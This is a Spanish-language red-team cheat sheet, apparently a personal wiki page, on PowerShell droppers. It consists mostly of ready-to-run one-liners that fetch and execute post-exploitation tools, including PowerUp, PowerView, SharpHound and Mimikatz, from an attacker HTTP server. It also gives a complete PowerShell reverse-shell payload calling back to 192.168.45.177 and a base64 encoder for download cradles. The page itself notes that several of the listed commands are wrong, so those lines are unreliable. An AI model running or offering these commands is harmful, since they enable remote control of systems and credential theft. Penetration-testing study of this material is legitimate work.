---
title: Droppers
draft: false
tags:
  - red-teaming
  - payloads
  - powershell
---
 
# Droppers

Un **dropper** descarga herramientas/payloads al sistema comprometido y las ejecuta. A diferencia de un [[Cradles|download cradle]] (que ejecuta en memoria sin tocar disco), aquí normalmente usamos `IEX` para cargar scripts `.ps1` de post-explotación directamente en memoria desde un servidor HTTP del atacante.

Flujo típico: sirve la herramienta desde Kali y cárgala en la víctima.
```bash
# En el atacante (directorio donde están las .ps1 / .exe):
$ python3 -m http.server 80
```

> [!Important] `IEX` solo para scripts, no para binarios
> `DownloadString(...) | IEX` sirve para **scripts de texto** (`.ps1`). Para un **ejecutable** (`.exe` como winPEAS) hay que descargarlo a disco y lanzarlo, no pasarlo por `IEX`:
> ```powershell
> # Ejecutable -> descargar a disco y ejecutar:
> PS C:\> iwr http://ATTACKER_IP/winPEASx64.exe -OutFile $env:TEMP\wp.exe; & $env:TEMP\wp.exe | Out-File $env:TEMP\winpeas.txt
> ```
> Además, en los scripts de abajo `| IEX > fichero` ejecuta el script y redirige **su salida**, no lo guarda: `| IEX > PowerUp.ps1` guarda lo que imprima, no el script. El patrón correcto es cargar el script (`IEX`) y luego invocar su función, p.ej.:
> ```powershell
> PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1'); Invoke-AllChecks
> ```

# Windows Post Exploitation

- HostRecon.ps1:
```powershell
PS C:\> (new-object system.net.webclient).downloadstring('http://ATTACKER_IP/HostRecon.ps1') | IEX
```

- winPEASx64.exe:
```powershell
PS C:\> (new-object system.net.webclient).downloadstring('http://ATTACKER_IP/winPEASx64.exe') | IEX > winpeas_output.txt
```

- PowerUp.ps1:
```powershell
PS C:\> (new-object system.net.webclient).downloadstring('http://ATTACKER_IP/PowerUp.ps1') | IEX > PowerUp.ps1
```

- PrivescCheck.ps1:
```powershell
PS C:\> (new-object system.net.webclient).downloadstring('http://ATTACKER_IP/PrivescCheck.ps1') | IEX > PrivescCheck.ps1
```

- PowerView.ps1:
```powershell
PS C:\> (new-object system.net.webclient).downloadstring('http://ATTACKER_IP/powerview.ps1') | IEX
```

- BloodHound:
```powershell
PS C:\> (new-object system.net.webclient).downloadstring('http://ATTACKER_IP/SharpHound.ps1') | IEX
```

- Mimikatz:
```powershell
(new-object system.net.webclient).downloadstring('http://ATTACKER_IP/mimikatz.txt') | IEX
```

Encoder:
```powershell
# PSH
PS> $Text = '$callback = New-Object System.Net.Sockets.TCPClient("192.168.45.177",443);$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()'

PS> $MyBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Text"))

PS> $MyBase64


##########################
python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://192.168.45.161/run2.txt\\') | IEX'.encode('utf-16le')).decode())"
```

---
# Notas relacionadas

- [[Cradles]] — ejecución en memoria sin escribir a disco
- [[Payloads]] — generación de payloads con msfvenom
- [[Shells]] — reverse / bind / web shells
- [[Obfuscation]] — evadir detección estática del AV
- [[Antimalware Scan Interface (AMSI)]] — por qué estos one-liners son bloqueados y cómo saltarlo
- [[Windows File Transfer]] — primitivas de transferencia de ficheros en Windows
